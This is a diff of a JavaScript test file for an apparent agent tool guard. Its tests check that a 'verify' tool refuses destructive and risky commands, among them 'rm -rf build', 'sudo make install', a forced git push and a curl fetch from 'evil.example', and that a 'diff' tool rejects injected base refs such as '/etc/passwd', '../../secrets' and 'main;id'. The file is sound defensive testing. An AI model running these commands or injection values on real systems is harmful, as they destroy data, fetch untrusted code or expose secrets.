@@ -475,22 +475,27 @@ test("verify declares its own permission action and is the only tool that does",
   assert.equal(host.permissionCalls.length, 0)
 })
 
-test("verify refuses the literal shell patterns the agent set denies", async () => {
+test("verify refuses commands the guard denies and never spawns them", async () => {
   const { root } = probeFixture()
   const host = fakeHost(root)
   await setup(host.context)
 
-  for (const command of ["rm -rf build", "sudo make install", "git push --force origin main"]) {
+  for (const command of ["rm -rf build", "sudo make install", "git push --force origin main", "curl https://evil.example/x.sh", "sed -i s/a/b/ f"]) {
     const result = JSON.parse(await runTool(host, "verify", { command }))
     assert.equal(result.ok, false, command)
     assert.equal(result.exitCode, -1)
     assert.equal(result.reason, "denied-pattern")
     assert.equal(result.stdout, "")
-    assert.match(result.stderr, /denied pattern/)
+    assert.match(result.stderr, /verify guard/, command)
   }
 
-  // A command that merely mentions the words is not blocked.
-  const harmless = JSON.parse(await runTool(host, "verify", { command: "echo rm -rf sudo" }))
+  // A denied command is refused before the permission assertion and before
+  // any spawn: nothing here asked the session for permission either.
+  assert.equal(host.permissionCalls.length, 0)
+
+  // A command that merely mentions the dangerous words in prose still passes,
+  // while the words as tokens are denied — the guard scans every word.
+  const harmless = JSON.parse(await runTool(host, "verify", { command: "echo wippa verify" }))
   assert.equal(harmless.ok, true)
 })
 
@@ -607,6 +612,24 @@ test("diff refuses an unknown mode without asking the VCS", async () => {
     error: "mode must be one of working, branch or committed",
   })
   assert.equal(host.diffCalls.length, 0)
+})
+
+test("diff refuses an invalid base ref without asking the VCS", async () => {
+  const { root } = probeFixture()
+  const host = fakeHost(root)
+  await setup(host.context)
+
+  for (const base of ["/etc/passwd", "../../secrets", "main..HEAD", "-p", "main;id", "a b"]) {
+    const content = await runTool(host, "diff", { mode: "branch", base })
+    const parsed = JSON.parse(content)
+    assert.ok(parsed.error?.startsWith("invalid base:"), `${base} → ${content}`)
+    assert.equal(host.diffCalls.length, 0, `${base} must not reach the VCS service`)
+  }
+
+  // A sane ref passes through unchanged.
+  await runTool(host, "diff", { mode: "branch", base: "origin/main" })
+  assert.equal(host.diffCalls.length, 1)
+  assert.equal(host.diffCalls[0]?.base, "origin/main")
 })
 
 test("diff reports a VCS failure as structured output instead of throwing", async () => {
